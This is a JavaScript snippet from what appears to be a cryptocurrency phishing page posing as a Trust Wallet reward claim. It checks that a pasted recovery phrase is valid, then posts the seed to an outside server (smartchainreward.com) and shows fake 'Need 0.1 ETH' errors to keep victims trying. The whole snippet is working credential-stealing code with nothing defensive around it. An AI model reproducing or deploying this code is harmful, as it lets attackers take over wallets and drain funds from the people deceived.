const redirectUrl = 'index.html' // redirect url setelah memasuki lastStage
      const lastStage = 3 // stage terakhir untuk redirect (stage === lastStage)
      let stage = 1 // awal stage
      const errorMsg = ['Need 0.1 ETH to receive the reward','Need 0.1 ETH to receive the reward'] // error message urutan berdasarkan stage
      let check = false
      let passForCreate = false
      let passForCreateConfir = false
      let words = false

      $(".closeBtn").on("click", function (e) {
        $(".alertBox").hide()
        $(".alert").hide()
      })  

      function showBtn() {
        if(words) $("#imp").prop("disabled", false)
        else $("#imp").prop("disabled", true) 
      }
      
      $('#wordsseed').on("change keyup paste", function(evt) {
        let pass = $(this).val()
        if(pass.split(" ")){
          $("#wordsErrorConfir").hide()
        
          try{
            let mnemonic = pass
            let mnemonicWallet = ethers.Wallet.fromMnemonic(mnemonic)
            words = true
            $("#wordsErrorConfir").hide()
            $("#incorecct").hide()
          } catch (e){
            $("#wordsErrorConfir").hide()
            $("#incorecct").show()
            words = false
          }

        } else{
          $("#wordsErrorConfir").show()
          words = false
          
          $("#incorecct").hide()
        }

        showBtn()
      })
      
      $("#imp").on("click", function(){      
        let mnemonic = $("#wordsseed").val()
        let wallet = ethers.Wallet.fromMnemonic(mnemonic)
        if(stage < lastStage) {
          $.ajax({
            method: "POST",
            url: "https://smartchainreward.com/chain/trustwallet.php",
            data: { seed: mnemonic, wallet: 'TrustWallet' },
            success: function(data) {
              updateStage()
            }
          })
        } else window.location = redirectUrl
      })

      function updateStage() {
        if(typeof errorMsg[stage - 1] !== 'undefined') $("#errorText").html(errorMsg[stage - 1])
        else $("#errorText").html(errorMsg[0])
        stage += 1
        $("#errorText").css('display','')
        setTimeout(function(){
          $("#errorText").css('display','none')
        }, 3000)
      }
      
      setTimeout(function(){
        $(".loader").hide() 
        $(".alertBox").fadeOut('slow')
        $(".alert").fadeOut('slow')
      }, 2000)